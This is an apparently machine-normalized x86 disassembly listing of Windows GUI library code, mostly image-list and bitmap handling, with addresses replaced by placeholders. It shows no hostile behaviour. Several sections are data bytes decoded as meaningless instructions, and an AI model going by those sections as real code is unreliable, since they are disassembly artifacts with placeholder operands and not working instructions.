jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44df40
sub_44df20
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_416044
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41e274
pop esi
pop ebx
retn
sub_44df40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_416340
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44df5c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44dfc4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_4591b4
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_451258
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e83c
mov edx ebp
call sub_44e8f4
inc eax
je r-xdata
sub_44e050
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44e070
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44e090
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ ebx + 0x58 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44e4c8
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44e4c8
sub_44e210
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41eacc
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_44e264
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4036c0
mov eax [ esi + 0x9c ]
call sub_4036c0
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44db2c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40dabc
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_44e2b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416b68
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44e360
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44e3c0
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44e4c8
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44e600
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44e660
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44e6bc
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44e720
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e360
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404828
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_404480
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403870
test eax eax
je r-xdata
sub_44e3c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44e4b8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44de90
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403870
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44de7c
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44e3c0
sub_44e4c8
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403870
test eax eax
je r-xdata
sub_44e540
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404828
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_404480
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4161a0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4161a0
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_44e5a8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403870
test eax eax
je r-xdata
sub_44e600
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404828
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_404480
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403870
test eax eax
je r-xdata
sub_44e660
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403870
test eax eax
je r-xdata
sub_44e6bc
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403870
test eax eax
je r-xdata
sub_44e720
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4161a0
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403870
test eax eax
je r-xdata
sub_44e780
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404828
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41e6fc
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44e360
sub_44e7cc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44e7f4
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x95 ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44e3c0
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44dc98
test al al
jne r-xdata
mov al 0x1
sub_44e864
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x90 ] eax
sub_44e898
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44e8c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4182e8
mov edi eax
mov eax esi
call sub_451544
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44e8f4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44e938
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44e95d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e964
retn
sub_44ea18
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax - 0x5bffbb15 ] ch
cmc
inc esp
add [ esp + ebp * 8 - 0x45fffbc ] dh
inc esp
add [ ecx ] al
add bh ch
push [ eax + 0x100044fb ]
push esp
inc ebx
jne r-xdata
jmp r-xdata
popad
jb r-xdata
mov eax 0x20000000
retn
je r-xdata
add ah dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x15 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jmp r-xdata
outsb
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x4000408d
jmp r-xdata
mov eax eax
dec esp
0xa030044 0x4954
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xea4cc08b
inc esp
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
push esp
jns r-xdata
add bh bh
retn
in eax 0x41
add al al
in al 0x41
add [ esi ] al
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x14 ] cl
inc esp
add [ eax - 0x6 ] ah
inc esp
add ah ch
std
inc esp
add [ eax - 0xbffbb07 ] ah
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x16 ] cl
inc esp
add [ edi ] al
imul esi [ ecx + ecx * 2 + 0x6d ] 0x6656761
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
in al 0xea
inc esp
sub_44eabb
add [ eax ] ch
add [ eax ] al
dec eax
inc ecx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x14 ] cl
inc esp
add [ eax - 0x6 ] ah
inc esp
add ah ch
std
inc esp
add [ eax - 0xbffbb07 ] ah
in eax 0x41
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax - 0x5bffbb15 ] ch
cmc
inc esp
add [ esp + ebp * 8 - 0x45fffbc ] dh
inc esp
add [ ecx ] al
add bh ch
push [ eax + 0x100044fb ]
push esp
inc ebx
jne r-xdata
mov eax 0x20000000
retn
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x4000408d
jmp r-xdata
add bh bh
retn
sub_44eb3f
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx - 0xa1e173a ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 - 0x6617f08c ] 0x4e
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pushad
dec ecx
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_44eba8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e1a4
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_44ebf4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_41e1a4
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_44ec48
push ebx
push esi
push edi
call sub_403a8c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_416288
mov edx eax
mov eax edi
call sub_44fc00
mov eax [ edi + 0x50 ]
call sub_4036c0
mov eax edi
call sub_44efa4
mov eax [ edi + 0x4c ]
call sub_4036c0
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41e1f0
test bl bl
jle r-xdata
call sub_4036c0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403a74
sub_44ecb4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44ed61
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44fb88
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44ed80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ed68
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_44ed80
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44ee21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4278c4
mov eax ebx
call sub_426d44
mov eax [ eax + 0x14 ]
xor edx edx
call sub_421ce0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_414b64
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_426d44
pop edx
call sub_422084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ee28
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44ee44
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44ed80
pop ecx
pop edx
pop ebx
retn
sub_44ee7c
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44ed6c
test al al
je r-xdata
mov eax esi
call sub_44f538
mov eax esi
call sub_44ed80
mov eax esi
mov si 0xffef
call sub_4038bc
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44eec0
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_44ed6c
test al al
je r-xdata
mov eax esi
call sub_44f538
mov eax esi
call sub_44ed80
mov eax esi
mov si 0xffef
call sub_4038bc
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44ef04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44efa4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44ee44
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_4038bc
sub_44ef50
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44fb10
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_426db0
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44efa4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_4038bc
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44ef40
push eax
call ImageList_Destroy
sub_44efdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44f06b
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov edi eax
mov [ ebx + 0x3c ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
